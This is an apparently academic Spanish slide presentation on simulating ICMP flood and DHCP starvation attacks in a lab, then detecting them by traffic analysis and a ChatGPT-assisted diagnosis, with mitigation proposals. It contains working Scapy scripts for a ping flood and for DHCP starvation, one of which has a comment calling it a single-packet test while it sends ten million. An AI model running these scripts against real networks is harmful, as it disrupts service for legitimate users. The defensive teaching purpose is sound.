---
title: "Simulaci√≥n, Diagn√≥stico y Prevenci√≥n de Ataques de Red"
subtitle: "An√°lisis de ICMP Flood y DHCP Starvation"
author:
  - Camila Guzm√°n
  - Dami√°n Luna
  - Juan Pablo de la Pe√±a
  - Gonzalo Higuera
  - Alfredo Lopez
format:
  revealjs:
    theme: dark
    transition: slide
    slide-number: true
    toc: true
    toc-depth: 3
    incremental: true
    footer: "Seguridad de Redes - Proyecto Final"
    df-print: kable
    code-line-numbers: true
    chalkboard: false
    preview-links: auto
    slide-level: 2
---

# Abstract
El trabajo analiza dos ataques de denegaci√≥n de servicio: ICMP Flood y DHCP Starvation. 

Para ello, se construy√≥ un laboratorio
- se configur√≥ una topolog√≠a de red
- se lanzaron ambos ataques
- se captur√≥ el tr√°fico con herramientas con Scapy y Wireshark.

Posteriormente, se aplicaron t√©cnicas de ciencia de datos a los archivos¬†*pcapng*¬†para detectar anomal√≠as asumiendo el no conocer previamente la existencia de los ataques.

Finalmente, se utiliz√≥ una inteligencia artificial (ChatGPT 5.1) para obtener un diagn√≥stico adicional y recomendaciones de mitigaci√≥n.

Los resultados muestran la alta efectividad de ambos ataques para afectar la disponibilidad del servicio y destacan la importancia de implementar controles como DHCP Snooping, port security, limitaci√≥n de ICMP, IDS/IPS y monitoreo continuo en infraestructuras reales.

---

# Fase 1: Dise√±o del escenario y explicaci√≥n del ataque

## Simulaci√≥n Topol√≥gica

![Topology](../figures/topology.png)

![Configuration code](../figures/config_code.png)

se descubri√≥ que, dada la configuraci√≥n del switch en el laboratorio de pruebas, el an√°lisis solamente podr√° ser realizado desde el ordenador de la v√≠ctima.

---

## Ataques
Los dos causantes de DoS seleccionados a implementar fueron 
- **DHCP Starvation**, el cual env√≠a numerosas solicitudes DHCP falsas con direcciones MAC distintas para agotar el rango de direcciones IP disponibles - impidiendo que dispositivos leg√≠timos obtengan configuraci√≥n de red-
-  **Ping Flood** , este env√≠a un gran volumen de paquetes ICMP Echo Request para saturar el ancho de banda o recursos del sistema objetivo. 
---

## Creaci√≥n del Entorno de Trabajo

Primeramente, se crea la topolog√≠a de trabajo nuevamente, donde se incluye la consola al router con funci√≥n de la v√≠ctima, y una segunda computadora que funciona como atacante y analista. 

Se configura un grupo dhcp con el rango de IPs de 192.168.10.1 255.255.255.0 del cual se excluyen las primeras 10 (la primera correspondiente al router).

Luego, desde la computadora del atacante se abre WireShark y se realizan pruebas de pings infinitos para asegurar comunicaci√≥n entre las computadoras.

---

## PING FLOOD

Pse crea un archivo python usando la librer√≠a ***Scapy***.

En la funci√≥n especificada para construir el ataque, se incluye la direcci√≥n IP v√≠ctima, el n√∫mero de paquetes a enviar y el tama√±o de cada paquete. 

Para implementar el c√≥digo, se direccion√≥ hacia la ip **192.168.10.21** con un total de 1,000 paquetes y un peso de 65,000 bytes (el m√°ximo dentro de paquetes ICMP).

---

``` python
from scapy.layers.inet import IP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send

def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 400):
    ip = IP(dst=target_ip_address)
    icmp = ICMP()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)


ip = "192.168.10.11"
send_ping(ip, number_of_packets_to_send=10000)
```
---

El script es ejecutado desde la terminal del atacante

Con fines de ratificaci√≥n, se intent√≥ hacer ping desde la computadora del cliente al router, donde en ocasiones, el tiempo de respuesta disminuye.

En Wireshark esto se contempla como un conjunto masivo de observaciones donde se reporta el protocolo ICMP hacia **192.168.10.21** y sus Echos correspondientes.

![Evidence of Attack](../figures/ping_flood0.png)

![Evidence of Attack](../figures/ping_flood1.png)

---

## DHCP Starvation

se utiliza igualmente **scapy**

En el c√≥digo se define  funciones para crear las direcciones MAC falsas, para buscar una interfaz cuya IP empiece con el prefijo indicado y entregar el nombre de la interfaz. 

En la implementaci√≥n se hace uso de esta informaci√≥n para hacer una solicitud de asignaci√≥n de  IP junto con la cantidad de IPs a solicitar especificada por el usuario. 

Esta se ejecut√≥ desde la terminal del atacante siendo ‚ÄúEthernet‚Äù la interfaz identificada.

---

``` python
# dhcpStarvation_helper.py
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    RandMAC, sendp, get_if_list, get_if_addr
)
import sys

# Construye el DHCP Discover (ajusta si ya tienes otra versi√≥n)
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / \
    IP(src='0.0.0.0', dst='192.168.10.255') / \
    UDP(sport=68, dport=67) / \
    BOOTP(op=1, chaddr=RandMAC()) / \
    DHCP(options=[('message-type','discover'), ('end')])

def find_iface_by_subnet(prefix="192.168.10."):
    """
    Busca una interfaz cuya IP empiece con prefix.
    Devuelve el nombre de la interfaz o None.
    """
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip and ip.startswith(prefix):
                return iface
        except Exception:
            # algunas interfaces no tienen IP o generan excepci√≥n
            pass
    return None

def choose_interface(preferred_prefix="192.168.10."):
    # 1) si el usuario pasa el nombre por argumento de l√≠nea de comandos, usarlo
    if len(sys.argv) > 1:
        return sys.argv[1]

    # 2) buscar por prefijo de subred (√∫til en el aula)
    iface = find_iface_by_subnet(preferred_prefix)
    if iface:
        return iface

    # 3) heur√≠stica: elegir primera interfaz "Ethernet" o "Wi-Fi" si aparece
    ifaces = get_if_list()
    for name in ifaces:
        if "Ethernet" in name or "eth" in name.lower():
            return name
    for name in ifaces:
        if "Wi-Fi" in name or "wlan" in name.lower() or "wifi" in name.lower():
            return name

    # 4) fallback: la primera que no sea loopback
    for name in ifaces:
        if "loop" not in name.lower():
            return name

    # 5) si no hay nada, devolver None
    return None

def main():
    print("Interfaces detectadas por Scapy:", get_if_list())

    iface = choose_interface()
    if iface is None:
        print("ERROR: No se pudo detectar una interfaz v√°lida.")
        print("Prueba a ejecutar: python dhcpStarvation_helper.py \"Ethernet\"")
        return

    print("Interfaz elegida:", iface)
    print("Haciendo env√≠o de prueba (count=1). Si esto falla, revisa Npcap y permisos.")

    try:
        # prueba segura: solo un paquete
        sendp(dhcp_discover, iface=iface, count=10000000, verbose=1)
        print("Env√≠o realizado. Si ves tr√°fico en Wireshark/PCAP, ya funciona.")
    except Exception as e:
        print("Error al enviar paquetes con Scapy:")
        print(str(e))
        print("\nPosibles causas:")
        print("- No est√°s ejecutando como administrador.")
        print("- No tienes Npcap instalado (o no en modo 'WinPcap API-compatible').")
        print("- El adaptador f√≠sico est√° desconectado o en otra VLAN.")
        print("- El nombre de interfaz detectado no es correcto para tu sistema.")
        print("\nSoluci√≥n r√°pida: ejecuta el script desde PowerShell/CMD como administrador o")
        print("pasa el nombre de la interfaz manualmente: python dhcpStarvation_helper.py \"Ethernet\"")

if __name__ == "__main__":
    main()
```
---

``` python
#!/usr/bin/env python3
#DHCP Starvation:
#Import Scapy
from scapy.all import *

#conf.checkIPaddr needs to be set to False. 
#When conf.checkIpaddr the reponse IP isn't checked
#against sending IP address. Don't need to match.   
conf.checkIPaddr = False

#Create DHCP discover with destination IP = broadadcast
#Source MAC address is a random MAC address
#Source IP address = 0.0.0.0
#Destination IP address = broadcast
#Source port = 68 (DHCP / BOOTP Client)
#Destination port = 67 (DHCP / BOOTP Server)
#DHCP message type is discover
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

#Send packet out of eth0 and loop the packet
sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)

#Credits:
#https://scapy.readthedocs.io/_/downloads/en/latest/pdf/
#https://www.programcreek.com/
```
---


En WireShark, esto se representa en m√∫ltiples solicitudes DHCP. 

Para verificar que fue exitoso el ataque, en la consola se busca los estad√≠sticos del servidor DHCP, donde se verifica que 244 fueron asignadas (recordemos que las primeras 10 direcciones fueron omitidas y una corresponde al router).

![Evidence of Attack](../figures/dhcp_starv0.png)

![Evidence of Attack](../figures/dhcp_starv1.png)

---

## Conclusi√≥n de la simulaci√≥n
La pr√°ctica confirma que, en un entorno controlado, tanto el DHCP Starvation como el Ping Flood son capaces de degradar y/o interrumpir el servicio de red

- el primero acapara las direcciones disponibles del servidor DHCP (245 leases asignados en la prueba) 
- el segundo crea congesti√≥n perceptible en la conectividad ICMP hacia el router

Las evidencias captadas con Wireshark reafirman la efectividad de los ataques implementados en Python usando Scapy y la importancia de la monitorizaci√≥n para detectar este tipo de anomal√≠as. 

Como lecciones pr√°cticas, estos ataques muestran la necesidad de controles de seguridad a nivel de capa 2/3 en redes LAN: habilitar DHCP Snooping, port security (limitaci√≥n de MACs por puerto), rate limiting de ICMP, reglas de ACL y sistemas de detecci√≥n de intrusos para mitigar y alertar sobre patrones an√≥malos.

------------------------------------------------------------------------

# Fase 3: An√°lisis de datos con Python

**El objetivo**
poder identificar los ataques realizados desde el puesto de un analista de tr√°fico
- desconoce su realizaci√≥n
- se convirti√≥ el archivo *pcapng* de la ventana de tiempo de la simulaci√≥n a un **csv** 
- se abre con Python para poder analizar y hacer visualizaciones del comportamiento de paquetes junto con sus anomal√≠as detectadas

---

## Resultados

Se grafica el flujo de paquetes a trav√©s del tiempo.
- incremento significante en referencia al tr√°fico no priorizado
    - primeros diez minutos
    - minutos 37 y 42.

![Time Series of Package traffic (All packets)](../figures/lineChartAllPackets.png)

---

Se descubre que hubo una proporci√≥n excesiva de paquetes ICMP y DHCP, la cual excede en millones al resto de protocolos. 

Esta evidencia levanta sospechas al ser comportamiento an√≥malo.

![Top IPs by Protocol](../figures/top_by_protocol.png)

---

Al sobreponer este filtro de paquetes sobre la linea de tiempo anterior, se comprueba que esos protocolos son el origen de los picos de tr√°fico. 

![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)

---

- direcciones IP origen y destino ordenadas por frecuencia
- **El hallazgo** 
    -  la direcci√≥n conflictiva es la 192.168.10.13
    -  direcci√≥n victima es la 192.168.10.1 (ruteador)

Esto da indicadores de ataques con intenci√≥n de deshabilitarlo.

![Top IPs by Destination](../figures/top_by_destination.png)

![Top IPs by Source](../figures/top_by_source.png)

---

La l√≠nea de tiempo muestra dos fases distintas de ataque: 

**ICMP Flood** 
- es m√°s r√°pido y visible, ya que satura el ancho de banda o la capacidad de respuesta del servidor mediante miles de solicitudes ping
- Es eficiente a corto plazo, pero f√°cil de detectar y mitigar (por firewalls o limitaci√≥n de ICMP).

**DHCP Starvation**
- no genera tanto tr√°fico, pero bloquea la asignaci√≥n de IPs v√°lidas a los clientes leg√≠timos
- silencioso y persistente
    - m√°s eficiente estrat√©gicamente, especialmente en redes locales (LAN).

![Time Series of ICMP and DHCP Package traffic](../figures/lineChart.png)

---

### Conclusi√≥n de Fase

Aunque ambos ataques logran afectar la disponibilidad de la red, el DHCP Starvation es m√°s eficiente a nivel estrat√©gico, ya que usa menos recursos para saturar el serivcio del router. En cambio, el ICMP Flood provoca un impacto inmediato con un pico m√°s alto, pero es m√°s f√°cil de detectar y bloquear.

---

# Fase 4: Diagn√≥stico con Inteligencia Artificial y mitigaci√≥n

El objetivo de esta actividad es consultar a alguna inteligencia artificial, en este caso Chat-GPT Pro 5.1, con los datos recolectados de la simulaci√≥n del ataque y captura de tr√°fico en un archivo *.pcapng*, elaborar un diagn√≥stico final y proponer soluciones o mitigaciones t√©cnicas frente a las anomal√≠as identificadas. Por cuestiones de limpieza, se incluir√°n s√≥lo las partes cruciales de la conversaci√≥n.

---

## Transcripci√≥n de la conversaci√≥n con Chat-GPT

`Prompt:` *Hola, chat. Eres un analista de tr√°fico de datos (ciberseguridad) y te lleg√≥ este archivo .pcapng. Tu objetivo es analizar y mencionar las anomal√≠as que puedas encontrar. Pesa m√°s de 700 megas el archivo, as√≠ que estar√° en ZIP.*

---

::: callout-note
`Chat-GPT:` *\[...\]*

1.  **Panorama general del tr√°fico En el .pcapng hay:**

-   \~824,397 paquetes en total
-   \~822k IPv4, \~1.2k IPv6
-   \~1k no-IP

Proporci√≥n por protocolo de capa 3:

-   ICMP: \~62.5% (515k paquetes) ‚Üí much√≠simo
-   UDP: \~37.2% (306k paquetes)
-   TCP: casi inexistente: 270 paquetes (\~0.03%)

Top hosts internos: 192.168.10.13 ‚Äì host m√°s activo (principal origen) 192.168.10.1 ‚Äì muy probablemente el gateway/router 192.168.10.12 ‚Äì segundo host interno importante 192.168.10.11 *\[...\]*
---

2.  **Anomal√≠a #1 ‚Äì Tr√°fico ICMP** *\[...\]* entre pocos hosts Hay m√°s de 515,000 paquetes ICMP distribuidos en solo 4 flujos: 192.168.10.13 ‚Üî 192.168.10.1 192.168.10.13 ‚Üî 192.168.10.12 

Tipos ICMP observados:

-   **Type 8, code 0** ‚Äì Echo Request (pings)
-   **Type 0, code 0**‚Äì Echo Reply
-   **Type 3, code 1** ‚Äì Destination Unreachable (host unreachable)
-   **Type 3, code 2** ‚Äì Destination Unreachable (protocol unreachable)

<mark>*\[...\]* Para un entorno normal, no es nada com√∫n tener \>500k ICMP en una captura as√≠. Hay flujos ICMP muy sim√©tricos, con \>120k paquetes por flujo (parece ping flood o prueba de estr√©s). *\[...\]* 

<strong> üëâ Interpretaci√≥n: </strong> Esto huele a ataque o prueba de ICMP flood / host discovery masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12. No parece tr√°fico ‚Äúnormal de usuario‚Äù (tipo un par de pings).</mark>

---

3.  **Anomal√≠a #2 ‚Äì Tormenta de DHCP (UDP 67)** con direcciones ‚Äúraras‚Äù Puertos destino m√°s usados (UDP/TCP):

-   67/UDP (DHCP server): \~304,315 paquetes
-   53/UDP (DNS): 1,280
-   16990/UDP: 875
-   80/TCP: 150
-   69/UDP (TFTP): 22
-   137/UDP, 138/UDP
-   5355/UDP: unos cuantos (NetBIOS/LLMNR)

*\[...\]*

<mark> <strong>üëâ Interpretaci√≥n:</strong> Esto es altamente sospechoso de DHCP starvation / DHCP flood o de una herramienta que genera tr√°fico DHCP malformado o spoofeado. El uso de 192.168.10.0 como host refuerza la idea de spoofing o de un escenario de laboratorio para ataques.</mark>

*\[...\]*
---

9.  **Resumen ejecutivo** *\[...\]* En este .pcapng se observan m√∫ltiples comportamientos an√≥malos altamente sugerentes de un escenario de laboratorio con ataques: ICMP flood / scanning masivo entre 192.168.10.13, 192.168.10.1 y 192.168.10.12 (m√°s de 500k paquetes ICMP). Tormenta DHCP con direcciones de origen/destino no est√°ndar (192.168.10.0 ‚Üí 192.168.10.255, \>300k paquetes), compatible con DHCP starvation o flood *\[...\]*.
:::

---
## Diagn√≥stico final

En resumen, identificaron los siguientes elementos: 
1. **ICMP Flood/Ping Flood:** Chat-GPT fue capaz de reconocer m√°s de 515,000 paquetes ICMP entre pocos hosts. Su interpretaci√≥n hace hincapi√© en la existencia de un tr√°fico anormalmente elevado, y cito, ‚Äúorientado a saturar la red o realizar reconocimiento agresivo‚Äù.

2. **DHCP Starvation:** En este caso, Chat-GPT encontr√≥ m√°s de 300,000 solicitudes DHCP con direcciones inv√°lidas (192.168.10.0, por ejemplo). La interpretaci√≥n se centra en el intento de consumir todas las direcciones del servidor DHCP para impedir que clientes leg√≠timos reciban red.

3.  Uso excesivo de un puerto UDP at√≠pico (67).

---

# Propuesta de mitigaci√≥n

---
## Propuesta del equipo

1.  Limitar la cantidad de pings permitidos por segundo. Configurar en el router o firewall un l√≠mite de cu√°ntas solicitudes ICMP puede recibir el equipo por segundo. Con esto, aunque un atacante mande miles de pings, el router simplemente los va a ignorar.
2.  Bloquear pings provenientes de direcciones sospechosas. En la captura vimos direcciones que no deber√≠an existir (como 192.168.10.0). Se pueden bloquear manualmente para evitar que env√≠en m√°s paquetes ICMP.
3.  Reducir el uso de ICMP dentro de la red. Si no es estrictamente necesario, se puede restringir el ping entre todos los equipos para reducir la superficie de ataque. Por ejemplo: permitir pings solo al gateway para diagn√≥stico y bloquear el resto.
4.  Monitorear el equipo que m√°s paquetes ICMP envi√≥. El host 192.168.10.13 fue el m√°s activo. Se recomienda revisarlo, porque puede estar infectado o mal configurado.
5.  Crear alertas si el volumen de ICMP sube m√°s de lo normal. Configurar herramientas de monitoreo b√°sico para que avise si se detecta de nuevo una cantidad alta de ICMP.

En resumen: Limitar ICMP, bloquear direcciones raras, monitorear el equipo m√°s activo y activar alertas para evitar que un ping flood o DHCP Starvation vuelva a saturar la red.

---

### Chat-GPT:

::: callout-note
1.  **Mitigaci√≥n contra ICMP Flood (Ping Flood)**

    1.  Implementar rate limiting en dispositivos perimetrales. Configurar l√≠mites para las solicitudes ICMP de tipo echo-request. Esto reduce la saturaci√≥n del plano de control. Ejemplo de regla para limitar a 10 paquetes por segundo:

    2.  Filtrado de direcciones malformadas Bloquear paquetes ICMP provenientes de direcciones que no deber√≠an usarse como origen, como 192.168.10.0 o 255.255.255.0. 1.3. Control Plane Policing (CoPP) Configurar pol√≠ticas en el router para limitar la cantidad de ICMP que llega al CPU.

---
2.  **Mitigaci√≥n contra DHCP Starvation / DHCP Flood**

    1.  Habilitar DHCP Snooping Evita que puertos no autorizados generen solicitudes DHCP masivas. Configuraci√≥n recomendada: ip dhcp snooping ip dhcp snooping vlan 10 interface GigabitEthernet0/1 ip dhcp snooping limit rate 10
    2.  Implementar Port Security Limitar la cantidad de direcciones MAC permitidas por puerto para impedir creaci√≥n de cientos de clientes falsos. switchport port-security switchport port-security maximum 2 switchport port-security violation restrict

---

*\[...\]*

7.  **Mitigaci√≥n continua (Monitoreo y endurecimiento)**

    1.  Configurar un IDS/IPS. Se recomienda utilizar Snort o Suricata con reglas espec√≠ficas para detectar:

    -   Flood ICMP Solicitudes
    -   DHCP an√≥malas
    -   Escaneos SYN
    -   Spoofing
    -   Uso de puertos no est√°ndar

    2.  Establecimiento de alertas. Configurar alertas en herramientas de monitoreo como Zabbix, PRTG o Grafana. Los umbrales sugeridos incluyen: Aumento anormal en tr√°fico ICMP, Incremento en solicitudes DHCP, Elevaci√≥n en paquetes TCP SYN, Actividad inesperada en puertos UDP
    3.  Endurecimiento de sistemas Actualizaci√≥n continua de sistemas y firmware Deshabilitar servicios no utilizados (como TFTP) Monitoreo de integridad con herramientas como Wazuh o Tripwire
:::

---

# Conclusi√≥n del Proyecto

- Demostrar de manera pr√°ctica c√≥mo distintos ataques de denegaci√≥n de servicio  (ICMP Flood y DHCP Starvation) pueden comprometer la disponibilidad de una red incluso en escenarios locales aparentemente protegidos. 

- ICMP Flood provoca un impacto inmediato y masivo en el tr√°fico
-  DHCP Starvation opera de forma silenciosa hasta agotar los recursos del servidor DHCP. 

El an√°lisis de tr√°fico con Python y los resultados generados por ChatGPT mostraron patrones claros de anomal√≠as, identificando a los dispositivos involucrados y validando la naturaleza de los ataques. 

En la √∫ltima fase resalta la crucialidad de un experto en √°rea para discriminar comportamientos an√≥malos de los com√∫nes, contextualizar tr√°fico en una red y comprender la configuraci√≥n y medidas de prevenci√≥n personalizadas: √°reas en las cuales fallan las herramientas de inteligencia artificial.

No obstante, estas pueden detectar en corto tiempo (aunque limitadas por el peso de los archivos) bastantes comportamientos generalmente denominados como at√≠picos. 
---

En conjunto, el proyecto evidencia la urgencia de implementar estrategias de defensa ya que cualquier red se encuentra comunmente vulnerable.